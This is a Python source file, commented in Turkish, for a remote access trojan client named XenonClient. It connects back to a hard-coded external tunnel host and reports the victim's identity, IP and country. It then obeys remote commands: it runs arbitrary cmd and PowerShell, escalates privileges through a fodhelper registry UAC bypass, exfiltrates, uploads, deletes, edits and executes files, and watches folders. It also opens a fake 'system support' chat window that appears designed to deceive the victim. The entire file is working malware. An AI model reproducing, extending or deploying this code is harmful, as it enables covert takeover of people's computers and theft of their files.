import socket
import threading
import subprocess
import os
import platform
import json
import webbrowser
import time
import tkinter as tk
from tkinter import messagebox, scrolledtext
import winreg
import base64
import tempfile
import zipfile
import io
import urllib.request
from pathlib import Path

# --- BAĞLANTI AYARLARI ---
HOST = "uwtd3ffva.localto.net" 
PORT = 1204
# -------------------------

# İsteğe bağlı: watchdog kurulu değilse izleme özelliği pasif olur
try:
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
    WATCHDOG_AVAILABLE = True
except ImportError:
    WATCHDOG_AVAILABLE = False
    print("Watchdog kurulu değil, klasör izleme devre dışı.")

class XenonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.chat_win = None
        self.chat_box = None
        self.chat_running = False
        self.watch_observers = {}  # path: observer

    def get_sys_info(self):
        # Public IP ve ülke bilgisini al
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
                public_ip = resp.read().decode('utf-8')
        except:
            public_ip = "Unknown"
        
        try:
            with urllib.request.urlopen('https://ipapi.co/country/', timeout=5) as resp:
                country = resp.read().decode('utf-8').strip()
        except:
            country = "TR"  # Varsayılan
        
        return json.dumps({
            "id": f"{os.getlogin()}@{platform.node()}",
            "ip": public_ip,
            "country": country,
            "os": f"{platform.system()} {platform.release()}"
        })

    def uac_bypass(self, cmd_to_run):
        try:
            path = r"Software\Classes\ms-settings\Shell\Open\command"
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd_to_run)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            return True
        except: return False

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.sock.send(self.get_sys_info().encode("utf-8"))
                self.listen()
            except Exception as e:
                print(f"Bağlantı hatası: {e}, 5 saniye sonra yeniden deneniyor...")
                time.sleep(5)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(16384).decode("utf-8")
                if not data: break

                if data.startswith("msg|"):
                    threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|",1)[1])).start()

                elif data == "chat_open":
                    if not self.chat_running:
                        threading.Thread(target=self.gui_chat, daemon=True).start()

                elif data.startswith("chat_msg|"):
                    if self.chat_box:
                        try:
                            self.chat_box.config(state="normal")
                            self.chat_box.insert(tk.END, f"DESTEK: {data.split('|',1)[1]}\n")
                            self.chat_box.config(state="disabled"); self.chat_box.see(tk.END)
                        except: pass

                elif data == "chat_close":
                    if self.chat_win: 
                        self.chat_running = False
                        try: self.chat_win.quit() 
                        except: pass

                elif data == "beep":
                    if platform.system() == "Windows":
                        import winsound
                        winsound.Beep(800, 500)

                elif data.startswith("open_url|"):
                    webbrowser.open(data.split("|",1)[1])

                elif data.startswith("shell|"):
                    self.run_cmd(data.split("|",1)[1], "cmd")
                
                elif data.startswith("ps|"):
                    self.run_cmd(data.split("|",1)[1], "powershell")

                elif data.startswith("elevate|"):
                    target = "cmd.exe" if "cmd" in data else "powershell.exe"
                    self.uac_bypass(target)

                elif data.startswith("playsound|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        filename = parts[1]
                        encoded = parts[2]
                        threading.Thread(target=self.play_audio, args=(filename, encoded), daemon=True).start()

                # --- DOSYA YÖNETİCİSİ KOMUTLARI ---
                elif data.startswith("file_list|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_file_list, args=(path,), daemon=True).start()

                elif data.startswith("file_download|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_file_download, args=(path,), daemon=True).start()

                elif data.startswith("file_upload|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        path = parts[1]
                        encoded = parts[2]
                        threading.Thread(target=self.handle_file_upload, args=(path, encoded), daemon=True).start()

                elif data.startswith("file_delete|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_file_delete, args=(path,), daemon=True).start()

                elif data.startswith("file_execute|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_file_execute, args=(path,), daemon=True).start()

                elif data.startswith("file_edit_get|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_file_edit_get, args=(path,), daemon=True).start()

                elif data.startswith("file_edit_save|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        path = parts[1]
                        content = parts[2]
                        threading.Thread(target=self.handle_file_edit_save, args=(path, content), daemon=True).start()

                elif data.startswith("mkdir|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_mkdir, args=(path,), daemon=True).start()

                elif data.startswith("zip|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_zip, args=(path,), daemon=True).start()

                elif data.startswith("unzip|"):
                    path = data.split("|",1)[1]
                    threading.Thread(target=self.handle_unzip, args=(path,), daemon=True).start()

                elif data.startswith("file_move|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        src, dst = parts[1], parts[2]
                        threading.Thread(target=self.handle_file_move, args=(src, dst), daemon=True).start()

                elif data.startswith("watch_folder|"):
                    parts = data.split("|", 2)
                    if len(parts) == 3:
                        path = parts[1]
                        action = parts[2]  # start/stop
                        threading.Thread(target=self.handle_watch_folder, args=(path, action), daemon=True).start()

            except Exception as e:
                print(f"Listen hatası: {e}")
                break
        if self.sock: self.sock.close()

    # --- SES ÇALMA ---
    def play_audio(self, filename, encoded):
        try:
            data = base64.b64decode(encoded)
            suffix = os.path.splitext(filename)[1]
            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
                f.write(data)
                temp_path = f.name

            self.play_sound_file(temp_path)
            threading.Timer(10, lambda: os.unlink(temp_path)).start()
        except Exception as e:
            print(f"[!] Ses çalma hatası: {e}")

    def play_sound_file(self, file_path):
        try:
            from playsound import playsound
            playsound(file_path)
        except ImportError:
            # playsound yoksa alternatifler
            system = platform.system()
            try:
                import pygame
                pygame.mixer.init()
                pygame.mixer.music.load(file_path)
                pygame.mixer.music.play()
                while pygame.mixer.music.get_busy():
                    time.sleep(0.1)
                pygame.mixer.quit()
            except ImportError:
                if system == "Windows":
                    if file_path.lower().endswith('.wav'):
                        import winsound
                        winsound.PlaySound(file_path, winsound.SND_FILENAME)
                    else:
                        os.startfile(file_path)
                elif system == "Linux":
                    os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}'")
                elif system == "Darwin":
                    os.system(f"afplay '{file_path}'")

    # --- DOSYA YÖNETİCİSİ FONKSİYONLARI ---
    def handle_file_list(self, path):
        try:
            items = []
            for entry in os.listdir(path):
                full = os.path.join(path, entry)
                try:
                    is_dir = os.path.isdir(full)
                    size = os.path.getsize(full) if not is_dir else 0
                    modified = os.path.getmtime(full)
                    items.append({
                        "name": entry,
                        "is_dir": is_dir,
                        "size": size,
                        "modified": modified
                    })
                except:
                    pass  # erişilemeyen dosyaları atla
            result = json.dumps(items)
            self.sock.send(f"file_res|list|{path}|{result}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|list|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_download(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            self.sock.send(f"file_res|download|{path}|{encoded}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|download|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_upload(self, path, encoded):
        try:
            data = base64.b64decode(encoded)
            with open(path, "wb") as f:
                f.write(data)
            self.sock.send(f"file_res|upload|{path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|upload|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_delete(self, path):
        try:
            if os.path.isdir(path):
                os.rmdir(path)  # boş klasör sil
            else:
                os.remove(path)
            self.sock.send(f"file_res|delete|{path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|delete|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_execute(self, path):
        try:
            if platform.system() == "Windows":
                os.startfile(path)
            else:
                subprocess.Popen([path], shell=True)
            self.sock.send(f"file_res|execute|{path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|execute|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_edit_get(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            self.sock.send(f"file_res|edit_get|{path}|{content}".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|edit_get|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_edit_save(self, path, content):
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(content)
            self.sock.send(f"file_res|edit_save|{path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|edit_save|{path}|error|{str(e)}".encode("utf-8"))

    def handle_mkdir(self, path):
        try:
            os.makedirs(path, exist_ok=True)
            self.sock.send(f"file_res|mkdir|{path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|mkdir|{path}|error|{str(e)}".encode("utf-8"))

    def handle_zip(self, path):
        try:
            zip_path = path + ".zip"
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                if os.path.isdir(path):
                    for root, _, files in os.walk(path):
                        for file in files:
                            full = os.path.join(root, file)
                            arcname = os.path.relpath(full, os.path.dirname(path))
                            zf.write(full, arcname)
                else:
                    zf.write(path, os.path.basename(path))
            self.sock.send(f"file_res|zip|{zip_path}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|zip|{path}|error|{str(e)}".encode("utf-8"))

    def handle_unzip(self, path):
        try:
            extract_to = os.path.splitext(path)[0]
            with zipfile.ZipFile(path, 'r') as zf:
                zf.extractall(extract_to)
            self.sock.send(f"file_res|unzip|{extract_to}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|unzip|{path}|error|{str(e)}".encode("utf-8"))

    def handle_file_move(self, src, dst):
        try:
            os.rename(src, dst)
            self.sock.send(f"file_res|move|{dst}|success".encode("utf-8"))
        except Exception as e:
            self.sock.send(f"file_res|move|{src}|error|{str(e)}".encode("utf-8"))

    def handle_watch_folder(self, path, action):
        if not WATCHDOG_AVAILABLE:
            self.sock.send(f"file_res|watch|{path}|watchdog not installed".encode("utf-8"))
            return
        if action == "start":
            if path in self.watch_observers:
                return
            event_handler = WatcherHandler(self.sock, path)
            observer = Observer()
            observer.schedule(event_handler, path, recursive=True)
            observer.start()
            self.watch_observers[path] = observer
            self.sock.send(f"file_res|watch|{path}|started".encode("utf-8"))
        elif action == "stop":
            if path in self.watch_observers:
                self.watch_observers[path].stop()
                self.watch_observers[path].join()
                del self.watch_observers[path]
                self.sock.send(f"file_res|watch|{path}|stopped".encode("utf-8"))

    # --- KOMUT ÇALIŞTIRMA (CMD/Powershell) ---
    def run_cmd(self, command_to_run, mode):
        def task():
            try:
                final_cmd = command_to_run
                if mode == "powershell":
                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
                
                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, cwd=os.getcwd())
                stdout, stderr = proc.communicate()
                res = (stdout + stderr).decode("cp857", errors="replace")
                
                if not res.strip(): res = "Komut çalıştırıldı (Çıktı yok)."
                self.sock.send(f"shell_res|{res}".encode("utf-8"))
            except Exception as e:
                self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
        threading.Thread(target=task, daemon=True).start()

    # --- SOHBET GUI ---
    def gui_chat(self):
        self.chat_running = True
        self.chat_win = tk.Tk()
        self.chat_win.title("Sistem Destek")
        self.chat_win.geometry("350x450")
        self.chat_win.attributes("-topmost", True)
        
        self.chat_box = scrolledtext.ScrolledText(self.chat_win, state="disabled")
        self.chat_box.pack(expand=True, fill="both", padx=5, pady=5)
        
        ent = tk.Entry(self.chat_win)
        ent.pack(fill="x", padx=5, pady=5)

        def send_srv(e=None):
            m = ent.get()
            if m:
                self.chat_box.config(state="normal")
                self.chat_box.insert(tk.END, f"Siz: {m}\n")
                self.chat_box.config(state="disabled"); ent.delete(0, tk.END)
                try: self.sock.send(f"chat|{m}".encode("utf-8"))
                except: pass
        
        ent.bind("<Return>", send_srv)
        
        def on_closing():
            self.chat_running = False
            self.chat_win.destroy()
            self.chat_win = None
            self.chat_box = None
            
        self.chat_win.protocol("WM_DELETE_WINDOW", on_closing)
        
        self.chat_win.mainloop()
        self.chat_running = False
        self.chat_win = None


# --- WATCHDOG EVENT HANDLER ---
if WATCHDOG_AVAILABLE:
    class WatcherHandler(FileSystemEventHandler):
        def __init__(self, sock, root_path):
            self.sock = sock
            self.root = root_path
        def on_any_event(self, event):
            # Olayı sunucuya bildir
            rel_path = os.path.relpath(event.src_path, self.root)
            msg = f"file_res|watch|{self.root}|{event.event_type}:{rel_path}"
            try:
                self.sock.send(msg.encode("utf-8"))
            except:
                pass


if __name__ == "__main__":
    XenonClient(HOST, PORT).connect()
